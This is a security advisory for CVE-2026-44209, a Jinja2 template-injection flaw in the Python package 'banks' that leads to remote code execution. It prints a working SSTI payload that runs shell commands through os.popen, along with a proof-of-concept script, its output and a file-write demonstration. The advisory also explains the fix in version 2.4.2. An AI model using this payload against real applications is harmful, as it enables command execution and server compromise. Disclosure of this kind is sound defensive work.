# [H] banks has Critical Remote Code Execution (RCE) via Jinja2 SSTI

## Summary
Severity: High
Advisory: GHSA-gphh-9q3h-jgpp
CVE: CVE-2026-44209
CWE: CWE-1336
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-gphh-9q3h-jgpp
Type: github-advisory

## Affected
- PyPI: `banks` — affected >=0 <2.4.2

## Details
## Summary

`banks <= 2.4.1` uses `jinja2.Environment()` (unsandboxed) to render prompt templates. Applications that pass user-supplied strings as the template argument to `Prompt()` are vulnerable to Server-Side Template Injection (SSTI), which can lead to Remote Code Execution (RCE) on the host system.

This is a vulnerability in how `banks` initializes its Jinja2 environment — not in Jinja2 itself.

## Vulnerable Code

`src/banks/env.py` — the global Jinja2 environment is created without sandboxing:

```python
env = Environment(
    autoescape=select_autoescape(enabled_extensions=("html", "xml"), default_for_string=False),
    ...
)
```

## Attack Scenario

An application that stores prompt templates in a database, accepts them via an API, or loads them from a user-supplied config file and passes them to `Prompt()` is vulnerable. For example:

```python
# User-controlled input reaches Prompt()
user_input = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
p = Prompt(user_input)
p.text()  # Executes arbitrary command on the host
```

## Proof of Concept

**Setup:**
```bash
pip install banks==2.4.1
```

**PoC script:**
```python
from banks import Prompt

payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
p = Prompt(payload)
result = p.text()
print(f"[+] Output: {result}")
```

**Confirmed output:**
```
[+] Output: uid=1000(ak) gid=1000(ak) groups=1000(ak),27(sudo),...

text

**File-write proof:**
```python
from banks import Prompt

p = Prompt("{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo POC > /tmp/rce_banks_exec').read() }}")
p.text()
```
```bash
ls -l /tmp/rce_banks_exec
# -rw-rw-r-- 1 ak ak 4 Apr 27 15:36 /tmp/rce_banks_exec
```

## Impact

Applications that allow end-users to supply or customize prompt templates are at risk of full Remote Code Execution, including arbitrary command execution, data exfiltration, and server compromise.

## Fix

Fixed in `banks 2.4.2` (PR #74) by switching to `jinja2.sandbox.SandboxedEnvironment`, which blocks the dunder attribute traversal chain this exploit relies on.

Developers on `banks <= 2.4.1` should upgrade to `2.4.2` and avoid passing untrusted user input as the template argument to `Prompt()`.

## Resources
- Fix: https://github.com/masci/banks/pull/74
- CVE-2024-41950 (Haystack — identical root cause, CVSS 7.5)
- CVE-2025-25362 (spacy-llm — identical root cause)
- CWE-1336: Improper Neutralization of Special Elements in a Template Engine

## References
- https://github.com/masci/banks/security/advisories/GHSA-gphh-9q3h-jgpp
- https://nvd.nist.gov/vuln/detail/CVE-2026-44209
- https://github.com/masci/banks/pull/74
- https://github.com/masci/banks
